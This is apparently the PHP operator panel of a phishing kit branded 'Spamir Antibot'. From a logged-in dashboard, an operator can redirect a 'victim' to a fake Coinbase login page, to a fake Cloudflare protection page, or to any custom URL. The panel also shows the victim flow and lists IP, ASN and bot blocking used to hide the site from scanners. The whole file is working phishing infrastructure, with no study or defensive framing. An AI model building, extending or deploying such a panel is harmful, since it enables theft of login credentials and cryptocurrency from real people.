<?php
// ==================== PROTECTION START ====================
// Start session FIRST
session_start();

// Then include auth and check login
require_once __DIR__ . '/admin/auth.php';

// Check if user is logged in - if not, redirect to login
if (!is_logged_in()) {
    header('Location: /admin/login.php');
    exit;
}

// Then include protection scripts
require_once __DIR__ . '/blocker.php';
require_once __DIR__ . '/blocker-raw.php';

// Handle logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    logout();
    header('Location: /admin/login.php');
    exit;
}

// Handle redirect commands
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redirect_command'])) {
    $command = $_POST['redirect_command'];
    $target = $_POST['redirect_target'] ?? '';
    
    // Use database instead of file
    $database = new Database();
    $db = $database->getConnection();
    
    switch($command) {
        case 'redirect_to_coinbase':
            $query = "INSERT INTO redirect_commands (command, target, created_at) 
                     VALUES ('redirect', 'coinbaselogin.html', NOW())";
            $_SESSION['success_message'] = 'Victim will be redirected to Coinbase Login';
            break;
            
        case 'redirect_to_cloudflare':
            $query = "INSERT INTO redirect_commands (command, target, created_at) 
                     VALUES ('redirect', 'index.php', NOW())";
            $_SESSION['success_message'] = 'Victim will be redirected to Cloudflare Protection';
            break;
            
        case 'redirect_custom':
            if (!empty($target)) {
                $query = "INSERT INTO redirect_commands (command, target, created_at) 
                         VALUES ('redirect', :target, NOW())";
                $stmt = $db->prepare($query);
                $stmt->execute([':target' => $target]);
                $_SESSION['success_message'] = 'Victim will be redirected to: ' . $target;
            } else {
                $_SESSION['error_message'] = 'Please enter a target URL';
            }
            break;
            
        case 'clear_redirect':
            $query = "DELETE FROM redirect_commands WHERE command = 'redirect'";
            $_SESSION['success_message'] = 'Redirect command cleared';
            break;
    }
    
    if (isset($query) && $command !== 'redirect_custom') {
        $db->exec($query);
    }
    
    header('Location: /panel.php');
    exit;
}

// Get current redirect status from database
$database = new Database();
$db = $database->getConnection();

// Create redirect_commands table if not exists
$create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
    id SERIAL PRIMARY KEY,
    command VARCHAR(50) NOT NULL,
    target TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";
$db->exec($create_table);

$query = "SELECT target FROM redirect_commands WHERE command = 'redirect' ORDER BY created_at DESC LIMIT 1";
$stmt = $db->query($query);
$current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
$current_redirect = $current_redirect ? $current_redirect['target'] : 'None';

// Handle messages from session
if (isset($_SESSION['success_message'])) {
    $success_message = $_SESSION['success_message'];
    unset($_SESSION['success_message']);
}

if (isset($_SESSION['error_message'])) {
    $error_message = $_SESSION['error_message'];
    unset($_SESSION['error_message']);
}
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Control Panel - Spamir Antibot</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        :root {
            --primary-color: #2196F3;
            --primary-color-light: #64b5f6;
            --primary-color-dark: #1976d2;
            --background-color: #303030;
            --surface-color: #424242;
            --text-color-light: #ffffff;
            --error-color: #f44336;
            --success-color: #4CAF50;
            --warning-color: #FF9800;
        }
        body {
            background-color: var(--background-color);
            color: var(--text-color-light);
            font-family: 'Roboto', sans-serif;
            display: flex;
            min-height: 100vh;
            flex-direction: column;
        }
        main {
            flex: 1 0 auto;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .card {
            background-color: var(--surface-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .btn {
            margin: 5px;
        }
        .btn.primary { background-color: var(--primary-color); }
        .btn.success { background-color: var(--success-color); }
        .btn.warning { background-color: var(--warning-color); }
        .btn.danger { background-color: var(--error-color); }
        .btn:hover { opacity: 0.9; }
        
        .input-field label {
            color: var(--text-color-light) !important;
        }
        .input-field input {
            color: var(--text-color-light);
            border-bottom: 1px solid var(--text-color-light) !important;
        }
        .input-field input:focus {
            border-bottom: 1px solid var(--primary-color) !important;
        }
        
        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-active { background-color: var(--success-color); }
        .status-inactive { background-color: var(--error-color); }
        .status-pending { background-color: var(--warning-color); }
        
        .victim-status {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .redirect-log {
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
        }
        
        nav {
            background-color: var(--surface-color) !important;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .message {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            color: var(--text-color-light);
        }
        .message.success { background-color: var(--success-color); }
        .message.error { background-color: var(--error-color); }
        .message.warning { background-color: var(--warning-color); }
        
        .quick-action-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .action-card {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }
        .action-card:hover {
            background: rgba(255,255,255,0.1);
            transform: translateY(-2px);
        }
    </style>
</head>
<body>
    <nav>
        <div class="nav-wrapper container">
            <a href="#" class="brand-logo">🛡️ Redirect Control Panel</a>
            <ul id="nav-mobile" class="right hide-on-med-and-down">
                <li><span style="padding: 0 15px;">Welcome, <?php echo $_SESSION['username']; ?></span></li>
                <li><a href="admin/index.php">Link Manager</a></li>
                <li><a href="?action=logout">Logout</a></li>
            </ul>
        </div>
    </nav>

    <main>
        <div class="container">
            <?php
            // Display messages
            if (isset($success_message)) {
                echo "<div class='message success'><i class='material-icons left'>check_circle</i> $success_message</div>";
            }
            if (isset($error_message)) {
                echo "<div class='message error'><i class='material-icons left'>error</i> $error_message</div>";
            }
            ?>

            <!-- Current Status -->
            <div class="card">
                <h5>🔄 Current Redirect Status</h5>
                <div class="victim-status">
                    <?php
                    $status_class = $current_redirect === 'None' ? 'status-inactive' : 'status-active';
                    ?>
                    <p>
                        <span class="status-indicator <?php echo $status_class; ?>"></span>
                        <strong>Active Redirect:</strong> 
                        <span style="color: #64b5f6;"><?php echo htmlspecialchars($current_redirect); ?></span>
                    </p>
                </div>
            </div>

            <!-- Quick Redirect Actions -->
            <div class="card">
                <h5>🎯 Quick Redirect Actions</h5>
                <div class="quick-action-grid">
                    <!-- Redirect to Coinbase Login -->
                    <div class="action-card">
                        <i class="material-icons large">login</i>
                        <h6>Send to Coinbase</h6>
                        <p>Redirect victim to Coinbase login page</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="redirect_to_coinbase">
                            <button type="submit" class="btn success waves-effect waves-light">
                                <i class="material-icons left">send</i>
                                Activate
                            </button>
                        </form>
                    </div>

                    <!-- Redirect to Cloudflare Protection -->
                    <div class="action-card">
                        <i class="material-icons large">security</i>
                        <h6>Send to Cloudflare</h6>
                        <p>Redirect victim back to protection page</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="redirect_to_cloudflare">
                            <button type="submit" class="btn primary waves-effect waves-light">
                                <i class="material-icons left">replay</i>
                                Activate
                            </button>
                        </form>
                    </div>

                    <!-- Clear Redirect -->
                    <div class="action-card">
                        <i class="material-icons large">clear</i>
                        <h6>Clear Redirect</h6>
                        <p>Remove active redirect command</p>
                        <form method="POST" style="margin: 0;">
                            <input type="hidden" name="redirect_command" value="clear_redirect">
                            <button type="submit" class="btn warning waves-effect waves-light">
                                <i class="material-icons left">clear_all</i>
                                Clear
                            </button>
                        </form>
                    </div>
                </div>
            </div>

            <!-- Custom Redirect -->
            <div class="card">
                <h5>🔧 Custom Redirect</h5>
                <form method="POST">
                    <div class="row">
                        <div class="input-field col s12 m8">
                            <input type="text" id="custom_target" name="redirect_target" 
                                   placeholder="coinbaselogin.html, index.php, or any URL">
                            <label for="custom_target">Target Page/URL</label>
                        </div>
                        <div class="col s12 m4">
                            <input type="hidden" name="redirect_command" value="redirect_custom">
                            <button type="submit" class="btn primary waves-effect waves-light" style="width: 100%;">
                                <i class="material-icons left">settings</i>
                                Set Custom Redirect
                            </button>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col s12">
                            <p class="grey-text">Examples: 
                                <code>coinbaselogin.html</code>, 
                                <code>index.php</code>, 
                                <code>https://example.com</code>
                            </p>
                        </div>
                    </div>
                </form>
            </div>

            <!-- Manual Page Access -->
            <div class="card">
                <h5>🌐 Manual Page Access</h5>
                <div class="row">
                    <div class="col s12 m4">
                        <a href="index.php" target="_blank" class="btn primary waves-effect waves-light" style="width: 100%;">
                            <i class="material-icons left">security</i>
                            Open Cloudflare Page
                        </a>
                    </div>
                    <div class="col s12 m4">
                        <a href="coinbaselogin.html" target="_blank" class="btn success waves-effect waves-light" style="width: 100%;">
                            <i class="material-icons left">login</i>
                            Open Coinbase Login
                        </a>
                    </div>
                    <div class="col s12 m4">
                        <a href="panel.php" class="btn warning waves-effect waves-light" style="width: 100%;">
                            <i class="material-icons left">refresh</i>
                            Refresh Panel
                        </a>
                    </div>
                </div>
            </div>

            <!-- System Information -->
            <div class="card">
                <h5>⚙️ System Information</h5>
                <div class="row">
                    <div class="col s12 m6">
                        <p><strong>Server Time:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                        <p><strong>PHP Version:</strong> <?php echo phpversion(); ?></p>
                        <p><strong>Protected Pages:</strong> index.php, panel.php, admin/</p>
                    </div>
                    <div class="col s12 m6">
                        <p><strong>Victim Flow:</strong> index.php → [Redirect] → Target</p>
                        <p><strong>Active Protection:</strong> IP Blocking, ASN Blocking, Bot Detection</p>
                        <p><strong>Session:</strong> <?php echo $_SESSION['username']; ?> (<?php echo $_SERVER['REMOTE_ADDR']; ?>)</p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="page-footer" style="background-color: var(--surface-color); margin-top: 40px;">
        <div class="container">
            <div class="row">
                <div class="col s12">
                    <p class="center-align">&copy; <?php echo date('Y'); ?> Spamir Antibot Redirect Control Panel</p>
                </div>
            </div>
        </div>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            M.updateTextFields();
        });
    </script>
</body>
</html>
